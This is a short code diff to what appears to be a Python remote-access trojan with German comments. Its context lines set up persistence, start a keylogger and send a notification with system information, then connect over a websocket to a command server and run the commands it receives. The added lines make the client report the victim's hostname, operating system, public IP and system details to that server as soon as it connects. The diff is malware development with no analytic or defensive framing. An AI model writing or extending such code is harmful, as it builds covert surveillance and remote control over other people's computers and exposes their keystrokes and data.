@@ -403,11 +403,25 @@ async def connect_to_server():
     ensure_persistence()
     start_persistent_keylogger()
     send_ntfy_notification()  # Sende Systeminformationen bei Start
-    
+
     while True:
         try:
             async with websockets.connect(SERVER_URI) as websocket:
                 print("[+] Verbunden mit dem Server.")
+
+                # Sende Hostname, OS und IP direkt nach Verbindungsaufbau
+                try:
+                    sysinfo = get_system_info()
+                    await websocket.send(json.dumps({
+                        "type": "client_hello",
+                        "hostname": socket.gethostname(),
+                        "os": platform.platform(),
+                        "ip": get_public_ip(),
+                        "output": sysinfo,
+                    }))
+                except Exception:
+                    pass
+
                 await process_commands(websocket)
         except (websockets.ConnectionClosed, ConnectionRefusedError):
             await asyncio.sleep(10)
